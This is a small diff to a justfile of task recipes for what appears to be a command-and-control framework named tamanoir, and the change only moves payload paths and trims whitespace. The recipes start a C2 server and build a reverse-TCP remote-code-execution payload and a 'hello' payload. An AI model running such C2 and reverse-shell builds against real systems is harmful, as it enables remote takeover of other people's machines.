@@ -35,12 +35,12 @@ c2_delete_rce c2ip="192.168.1.15" session_ip="192.168.1.180":
 #run c2 server
 c2_run:
     sudo systemctl stop systemd-resolved && RUST_LOG=debug sudo -E ./target/release/tamanoir-c2 start
-    
+
 #rce build (run on c2 server)
 rce_build_reverse_tcp :
-    ./target/release/tamanoir-c2  rce  build  -c ./assets/examples/payloads/reverse-tcp  -b "IP=127.0.0.1 PORT=8082"
+    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/reverse-tcp  -b "IP=127.0.0.1 PORT=8082"
 rce_build_hello :
-    ./target/release/tamanoir-c2  rce  build  -c ./assets/examples/payloads/hello
+    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/hello
 
 
 _atoi ipv4_address:
